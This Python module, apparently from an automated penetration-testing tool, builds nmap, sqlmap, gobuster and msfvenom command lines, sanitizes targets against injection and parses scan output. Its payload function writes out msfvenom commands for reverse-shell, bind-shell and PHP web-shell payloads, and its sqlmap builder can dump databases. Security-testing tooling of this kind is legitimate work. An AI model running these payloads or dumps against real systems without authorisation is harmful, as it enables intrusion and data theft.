# core/execution/command_tools.py
"""Command generation, output analysis, and validation — extracted from execution_engine.py."""

from __future__ import annotations

import logging
import queue
import re
from typing import Any

from core.execution.types import ExecutionResult, ExecutionStatus

logger = logging.getLogger(__name__)


# ====================
# CommandGenerator
# ====================
class CommandGenerator:
    """Generates optimized commands for different tools."""

    @staticmethod
    def _sanitize_target(target: str) -> str:
        """Sanitize target IP/hostname to prevent command injection."""
        import re as _re
        # H-3 FIX: Only allow valid IP addresses, hostnames, CIDR ranges
        if _re.match(r"^[a-zA-Z0-9._:/-]+$", target) and len(target) < 256:
            return target
        # Strip dangerous chars as fallback
        return _re.sub(r'[;&|$`"\'\\ \n\r]', "", target)[:255]

    def generate_nmap_command(
        self,
        target: str,
        scan_type: str = "full",
        ports: str | None = None,
        script: str | None = None,
    ) -> str:
        """Generate optimized nmap command."""
        # H-3 FIX: Sanitize target before interpolation
        safe_target = self._sanitize_target(target)
        if scan_type == "quick":
            cmd: str = f"nmap -T4 -F {safe_target}"
        elif scan_type == "stealth":
            cmd: str = f"nmap -sS -T2 {safe_target}"
        elif scan_type == "aggressive":
            cmd: str = f"nmap -A -T4 {safe_target}"
        elif scan_type == "version":
            cmd: str = f"nmap -sV -T4 {safe_target}"
        else:  # full
            cmd: str = f"nmap -sV -sC -T4 {safe_target}"

        if ports:
            cmd += f" -p {ports}"

        if script:
            cmd += f" --script={script}"

        cmd += " -oN nmap_scan.txt"

        return cmd

    def _sanitize_url(self, url: str) -> str:
        """Sanitize URL to prevent command injection."""
        # Remove dangerous characters that could break shell commands
        dangerous_chars: list[str] = [
            "'",
            '"',
            ";",
            "|",
            "&",
            "$",
            "`",
            "\\",
            "\n",
            "\r",
        ]
        sanitized: str = url
        for char in dangerous_chars:
            sanitized = sanitized.replace(char, "")
        # Also validate URL format
        if not sanitized.startswith(("http://", "https://")):
            logger.warning("URL doesn't start with http(s)://: %s", sanitized[:50])
        return sanitized

    def generate_sqlmap_command(
        self,
        url: str,
        level: int = 1,
        risk: int = 1,
        dbs: bool = False,
        tables: bool = False,
        dump: bool = False,
    ) -> str:
        """Generate sqlmap command with URL sanitization."""
        # SECURITY: Sanitize URL to prevent command injection
        safe_url: str = self._sanitize_url(url)
        # Validate level and risk are within bounds
        level = max(1, min(5, int(level)))
        risk = max(1, min(3, int(risk)))

        cmd: str = f"sqlmap -u '{safe_url}' --batch --level={level} --risk={risk}"

        if dbs:
            cmd += " --dbs"
        elif tables:
            cmd += " --tables"
        elif dump:
            cmd += " --dump"

        return cmd

    def generate_gobuster_command(
        self,
        url: str,
        wordlist: str = "/usr/share/wordlists/dirb/common.txt",
        extensions: str | None = None,
    ) -> str:
        """Generate gobuster command with URL sanitization."""
        # SECURITY: Sanitize URL
        safe_url: str = self._sanitize_url(url)
        # Sanitize wordlist path
        safe_wordlist: str = wordlist.replace("'", "").replace('"', "").replace(";", "")

        cmd: str = f"gobuster dir -u {safe_url} -w {safe_wordlist}"

        if extensions:
            # Sanitize extensions
            safe_ext: str = (
                extensions.replace("'", "").replace('"', "").replace(";", "")
            )
            cmd += f" -x {safe_ext}"

        cmd += " -o gobuster_results.txt"

        return cmd

    def generate_payload_command(
        self,
        payload_type: str,
        lhost: str,
        lport: int,
    ) -> str:
        """Generate payload generation command."""
        if payload_type == "reverse_shell":
            return f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o shell.elf"
        if payload_type == "bind_shell":
            return (
                f"msfvenom -p linux/x64/shell_bind_tcp LPORT={lport} -f elf -o bind.elf"
            )
        if payload_type == "web_shell":
            return (
                f"msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -o shell.php"
            )
        return f"msfvenom -p {payload_type} LHOST={lhost} LPORT={lport} -f raw"

    def optimize_command(self, command: str) -> str:
        """Optimize command for better performance."""
        # Add timeouts
        if "curl" in command and "--connect-timeout" not in command:
            command += " --connect-timeout 10"

        # Add output redirection if missing
        if any(tool in command for tool in ["nmap", "gobuster", "nikto"]):
            if "-o" not in command and ">" not in command:
                command += " -oN scan_output.txt"

        return command


# ====================
# OutputAnalyzer
# ====================
class OutputAnalyzer:
    """Analyzes and parses command output intelligently."""

    def analyze(self, result: ExecutionResult) -> dict:
        """Analyze execution result and extract insights."""
        analysis = {
            "success": result.status == ExecutionStatus.SUCCESS,
            "duration": result.duration,
            "exit_code": result.exit_code,
            "has_errors": bool(result.stderr),
            "insights": [],
        }

        # Detect tool type from command
        if "nmap" in result.command:
            analysis.update(self._analyze_nmap(result.stdout))
        elif "sqlmap" in result.command:
            analysis.update(self._analyze_sqlmap(result.stdout))
        elif "gobuster" in result.command:
            analysis.update(self._analyze_gobuster(result.stdout))
        elif "nikto" in result.command:
            analysis.update(self._analyze_nikto(result.stdout))

        # Check for common errors
        analysis["error_type"] = self._detect_error_type(result.stderr)

        return analysis

    def _analyze_nmap(self, output: str) -> dict:
        """Analyze nmap output."""
        insights = []
        open_ports = []

        # Find open ports
        port_pattern = r"(\d+)/tcp\s+open\s+(\w+)"
        matches: list[Any] = re.findall(port_pattern, output)

        for port, service in matches:
            open_ports.append({"port": port, "service": service})
            insights.append(f"Found open port {port} ({service})")

        return {
            "tool": "nmap",
            "open_ports": open_ports,
            "total_open": len(open_ports),
            "insights": insights,
        }

    def _analyze_sqlmap(self, output: str) -> dict:
        """Analyze sqlmap output."""
        insights = []
        vulnerable = False

        if "is vulnerable" in output.lower():
            vulnerable = True
            insights.append("SQL injection vulnerability found!")

        if "available databases" in output.lower():
            insights.append("Database enumeration successful")

        return {"tool": "sqlmap", "vulnerable": vulnerable, "insights": insights}

    def _analyze_gobuster(self, output: str) -> dict:
        """Analyze gobuster output."""
        insights = []
        found_dirs = []

        # Find discovered directories
        dir_pattern = r"(/.+?)\s+\(Status:\s+(\d+)\)"
        matches: list[Any] = re.findall(dir_pattern, output)

        for path, status in matches:
            found_dirs.append({"path": path, "status": status})
            if status == "200":
                insights.append(f"Found accessible directory: {path}")

        return {
            "tool": "gobuster",
            "found_directories": found_dirs,
            "total_found": len(found_dirs),
            "insights": insights,
        }

    def _analyze_nikto(self, output: str) -> dict:
        """Analyze nikto output."""
        insights = []

        if "0 host(s) tested" not in output:
            insights.append("Web server scan completed")

        return {"tool": "nikto", "insights": insights}

    def _detect_error_type(self, stderr: str) -> str | None:
        """Detect type of error from stderr."""
        if not stderr:
            return None

        stderr_lower: str = stderr.lower()

        if "command not found" in stderr_lower or "not recognized" in stderr_lower:
            return "missing_tool"
        if "permission denied" in stderr_lower:
            return "permission_error"
        if "no route to host" in stderr_lower or "network unreachable" in stderr_lower:
            return "network_error"
        if "timeout" in stderr_lower:
            return "timeout_error"
        if "connection refused" in stderr_lower:
            return "connection_error"
        return "unknown_error"


# ====================
# StreamingMonitor
# ====================
class StreamingMonitor:
    """Monitors command execution in real-time."""

    def __init__(self) -> None:
        self.output_queue: queue.Queue[str] = queue.Queue()
        self.monitoring = False


# ====================
# ExecutionValidator
# ====================
class ExecutionValidator:
    """Validates execution results and checks success criteria."""

    def validate(self, result: ExecutionResult, expected: dict) -> dict:
        """Validate execution result against expectations."""
        validation = {"valid": True, "checks": [], "failures": []}

        # Validate each expected criterion
        self._validate_exit_code(result, expected, validation)
        self._validate_output_contains(result, expected, validation)
        self._validate_no_errors(result, expected, validation)
        self._validate_duration(result, expected, validation)

        return validation

    def _validate_exit_code(
        self,
        result: ExecutionResult,
        expected: dict,
        validation: dict,
    ) -> None:
        """Validate exit code matches expected value."""
        if expected.get("exit_code") is None:
            return

        if result.exit_code == expected["exit_code"]:
            validation["checks"].append("Exit code matches")
        else:
            validation["valid"] = False
            validation["failures"].append(
                f"Exit code {result.exit_code} != {expected['exit_code']}",
            )

    def _validate_output_contains(
        self,
        result: ExecutionResult,
        expected: dict,
        validation: dict,
    ) -> None:
        """Validate output contains expected patterns."""
        output_patterns = expected.get("output_contains")
        if not output_patterns:
            return

        for pattern in output_patterns:
            if pattern in result.stdout:
                validation["checks"].append(f"Output contains '{pattern}'")
            else:
                validation["valid"] = False
                validation["failures"].append(f"Output missing '{pattern}'")

    def _validate_no_errors(
        self,
        result: ExecutionResult,
        expected: dict,
        validation: dict,
    ) -> None:
        """Validate no errors in stderr."""
        if not expected.get("no_errors", False):
            return

        if not result.stderr:
            validation["checks"].append("No errors in stderr")
        else:
            validation["valid"] = False
            validation["failures"].append("Stderr contains errors")

    def _validate_duration(
        self,
        result: ExecutionResult,
        expected: dict,
        validation: dict,
    ) -> None:
        """Validate execution duration within limit."""
        max_duration = expected.get("max_duration")
        if not max_duration:
            return

        if result.duration <= max_duration:
            validation["checks"].append("Duration within limit")
        else:
            validation["valid"] = False
            validation["failures"].append(
                f"Duration {result.duration}s > {max_duration}s",
            )
